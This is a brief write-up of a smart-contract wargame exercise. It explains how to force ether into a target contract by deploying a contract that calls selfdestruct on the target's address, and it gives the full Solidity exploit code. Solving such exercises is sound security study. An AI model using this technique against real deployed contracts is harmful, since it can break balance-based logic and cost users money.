Using a contract to send to the problem contract ensures the fund the received and it is unable to refund because the origin contract no longer exists.
Use of 'selfdestruct' keyword and sending a '1' wei along while deploying the contract completes this exercise.


pragma solidity ^0.4.18;

contract ForceSend {
    constructor(address instanceAddr) public payable {
        selfdestruct(instanceAddr);
    }
}
